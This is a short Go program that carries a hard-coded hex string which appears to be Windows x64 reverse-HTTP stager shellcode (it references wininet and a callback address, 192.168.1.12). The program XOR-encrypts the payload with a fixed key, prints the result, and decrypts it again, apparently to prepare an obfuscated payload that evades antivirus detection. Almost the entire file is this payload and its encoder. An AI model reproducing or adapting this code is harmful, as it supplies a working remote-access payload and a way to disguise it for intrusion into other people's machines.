package main

import (
	"fmt"
)

func main() { 

	myString := "fc4883e4f0e8cc000000415141505251564831d265488b5260488b5218488b52204d31c9488b7250480fb74a4a4831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d0668178180b020f85720000008b80880000004885c074674801d0448b40204901d08b481850e35648ffc9418b34884801d64d31c94831c041c1c90dac4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94bffffff5d4831db5349be77696e696e65740041564889e149c7c24c772607ffd553534889e1535a4d31c04d31c9535349ba3a5679a700000000ffd5e80d0000003139322e3136382e312e3132005a4889c149c7c0500000004d31c953536a035349ba57899fc600000000ffd5e8e90000002f386f674b4d4c6f6162712d6f51366c42794f656867416d555138565475504c4f4d51615f61354c4e6f614c36523334574c6231494e68735a5a6f55576a4e6d427248416264572d7567675f716241516d47615476326f6641524c577064585f776b4f5853526f617937514256624e442d4474597a6c6b637274666537447249696756446f785953724d757666362d65376645694a324c5f426d594a5958494453414144734f374c416b496c49654d7131745052685f6465386557412d7037384f523935424149334f5f706449567655706f41306e43677a72567a70434e6c447845536d3956326f004889c1535a41584d31c95348b8000228840000000050535349c7c2eb552e3bffd54889c66a0a5f535a4889f14d31c94d31c9535349c7c22d06187bffd585c0751f48c7c18813000049ba44f035e000000000ffd548ffcf7402ebcce85500000053596a405a4989d1c1e21049c7c00010000049ba58a453e500000000ffd5489353534889e74889f14889da49c7c0002000004989f949ba129689e200000000ffd54883c42085c074b2668b074801c385c075d258c3586a0059bbe01d2a0a4189daffd5"
	key := "55YItav67TArUuBP"
	
	original_array := []byte(myString)
	fmt.Println("			ORIGINAL : ")
	fmt.Println(original_array)
	fmt.Println()
	fmt.Println()
	fmt.Println()
	
	output := ""
	
	 for i := 0; i < len(myString); i++ {
                output += string(myString[i] ^ key[i % len(key)])
        }
	

	bshellcode := []byte(output)

    for i := 0; i < len(bshellcode); i++ {
        fmt.Print(", ", bshellcode[i])
    }
	
	encrypted_array := []byte{83, 86, 109, 113, 76, 82, 19, 2, 81, 100, 36, 74, 54, 22, 114, 96, 5, 5, 105, 121, 64, 80, 67, 7, 3, 101, 116, 66, 96, 71, 118, 104, 6, 4, 61, 123, 65, 80, 67, 0, 1, 97, 117, 74, 109, 23, 119, 98, 3, 5, 109, 113, 76, 3, 67, 4, 6, 108, 117, 74, 109, 23, 119, 98, 7, 5, 109, 113, 68, 7, 20, 1, 3, 53, 117, 19, 97, 17, 113, 97, 86, 12, 109, 113, 76, 3, 65, 4, 2, 100, 117, 74, 102, 68, 33, 96, 84, 86, 106, 42, 66, 80, 65, 85, 7, 102, 115, 17, 103, 69, 118, 97, 86, 4, 58, 112, 68, 5, 66, 7, 7, 101, 34, 67, 48, 71, 39, 52, 0, 7, 109, 113, 76, 3, 67, 4, 5, 100, 117, 67, 96, 68, 122, 50, 1, 7, 106, 42, 64, 89, 70, 7, 83, 100, 119, 68, 109, 68, 117, 104, 4, 13, 105, 43, 68, 83, 70, 80, 15, 97, 118, 64, 101, 69, 114, 96, 5, 5, 97, 43, 76, 81, 78, 14, 7, 100, 113, 66, 101, 69, 118, 104, 13, 0, 58, 121, 67, 85, 64, 1, 3, 108, 113, 67, 49, 69, 118, 100, 13, 87, 109, 121, 70, 81, 78, 84, 3, 108, 112, 74, 97, 76, 114, 97, 81, 5, 108, 121, 17, 82, 67, 0, 3, 108, 39, 20, 54, 76, 118, 97, 13, 87, 106, 125, 76, 89, 66, 14, 7, 101, 37, 68, 97, 17, 113, 97, 86, 12, 109, 113, 71, 80, 21, 6, 3, 101, 34, 67, 54, 76, 114, 52, 84, 86, 109, 120, 68, 80, 21, 7, 4, 108, 36, 66, 98, 64, 36, 97, 1, 86, 105, 122, 64, 2, 68, 2, 7, 108, 117, 71, 102, 76, 38, 97, 2, 0, 61, 113, 65, 89, 66, 2, 15, 54, 117, 66, 103, 65, 118, 105, 5, 4, 61, 121, 66, 87, 66, 7, 15, 54, 113, 17, 97, 77, 118, 100, 13, 87, 109, 121, 69, 2, 66, 15, 7, 101, 37, 66, 97, 68, 122, 50, 5, 1, 97, 113, 64, 89, 70, 7, 83, 100, 117, 67, 96, 77, 118, 97, 0, 13, 108, 44, 65, 88, 67, 87, 3, 101, 116, 74, 97, 68, 119, 105, 1, 4, 108, 40, 64, 89, 78, 5, 82, 55, 115, 66, 97, 68, 119, 98, 83, 83, 60, 121, 65, 89, 66, 7, 2, 109, 116, 19, 97, 77, 122, 50, 4, 7, 60, 112, 64, 3, 16, 80, 81, 50, 39, 20, 96, 17, 118, 105, 87, 80, 110, 126, 67, 82, 69, 4, 2, 50, 114, 65, 102, 71, 114, 96, 5, 5, 109, 120, 65, 87, 66, 15, 15, 109, 36, 68, 97, 77, 122, 97, 80, 86, 56, 121, 68, 80, 70, 6, 7, 100, 117, 75, 109, 76, 39, 101, 1, 12, 59, 42, 68, 83, 70, 6, 6, 101, 116, 17, 54, 69, 35, 104, 5, 4, 105, 42, 64, 80, 67, 2, 3, 109, 121, 75, 48, 65, 118, 51, 13, 12, 63, 120, 64, 80, 20, 87, 3, 55, 118, 69, 103, 67, 114, 103, 83, 83, 61, 124, 64, 2, 78, 15, 82, 53, 119, 74, 101, 68, 114, 97, 5, 5, 105, 121, 65, 88, 66, 7, 85, 53, 115, 75, 109, 69, 116, 50, 5, 5, 63, 47, 16, 84, 64, 87, 7, 53, 117, 67, 96, 16, 119, 96, 0, 5, 109, 45, 71, 80, 21, 15, 3, 48, 114, 67, 54, 69, 118, 104, 83, 83, 58, 121, 64, 89, 78, 15, 84, 102, 117, 74, 51, 19, 33, 96, 1, 13, 97, 112, 23, 80, 66, 7, 85, 53, 36, 19, 101, 19, 38, 54, 80, 5, 63, 47, 16, 84, 66, 14, 15, 109, 34, 69, 99, 20, 115, 96, 1, 4, 108, 113, 64, 2, 78, 15, 82, 102, 117, 74, 109, 76, 36, 105, 1, 4, 59, 40, 77, 88, 23, 3, 0, 96, 119, 67, 51, 19, 38, 101, 13, 0, 58, 121, 67, 85, 70, 87, 3, 109, 39, 20, 54, 16, 117, 101, 80, 0, 60, 113, 77, 82, 70, 6, 7, 100, 113, 66, 97, 77, 122, 99, 80, 86, 104, 121, 64, 89, 78, 15, 82, 102, 117, 22, 102, 68, 33, 105, 3, 84, 105, 125, 64, 80, 67, 14, 3, 108, 121, 75, 51, 76, 118, 97, 87, 84, 105, 123, 16, 88, 21, 14, 2, 50, 39, 20, 49, 64, 122, 99, 83, 13, 105, 121, 67, 4, 67, 3, 3, 108, 121, 65, 54, 65, 112, 96, 0, 80, 97, 112, 18, 87, 64, 87, 3, 100, 117, 67, 96, 76, 116, 104, 5, 5, 104, 121, 68, 81, 70, 6, 3, 101, 116, 74, 97, 77, 122, 105, 83, 7, 109, 113, 71, 80, 21, 15, 3, 101, 35, 19, 96, 77, 35, 100, 0, 6, 60, 124, 18, 7, 18, 3, 3, 108, 121, 75, 54, 70, 118, 105, 13, 12, 58, 126, 64, 5, 69, 7, 84, 109, 117, 75, 109, 76, 36, 96, 1, 13, 97, 112, 16, 0, 66, 14, 15, 109, 39, 75, 97, 68, 32, 49, 5, 7, 61, 112, 23, 89, 67, 80, 81, 50, 37, 71, 109, 70, 36, 104, 5, 5, 110, 45, 70, 89, 67, 14, 3, 101, 116, 69, 96, 76, 116, 104, 5, 5, 109, 121, 68, 81, 70, 6, 3, 101, 116, 74, 99, 20, 114, 96, 0, 84, 109, 120, 22, 0, 70, 84, 5, 50, 113, 20, 102, 69, 36, 54, 81, 0, 108, 126, 65, 88, 66, 7, 85, 53, 118, 71, 99, 16, 118, 52, 3, 4, 63, 47, 16, 84, 66, 15, 81, 50, 34, 23, 48, 76, 113, 51, 83, 83, 63, 47, 18, 7, 66, 14, 7, 101, 34, 65, 97, 77, 112, 105, 86, 3, 109, 113, 76, 84, 16, 0, 0, 97, 35, 70, 97, 68, 36, 54, 80, 2, 108, 113, 66, 0, 70, 6, 2, 109, 117, 75, 54, 66, 33, 98, 83, 5, 59, 124, 21, 83, 67, 0, 81, 50, 37, 71}
	
	fmt.Println("			ENCRYPTED : ")
	fmt.Println(encrypted_array)
	fmt.Println()
	fmt.Println()
	fmt.Println()
	
	decrypt_output := ""
	
	for i := 0; i < len(encrypted_array); i++ {
                decrypt_output += string(encrypted_array[i] ^ key[i % len(key)])
    }
	
	
	
	fmt.Println("			DECRYPTED : ")
	fmt.Println(decrypt_output)
	fmt.Println()
	fmt.Println()
	fmt.Println()
} 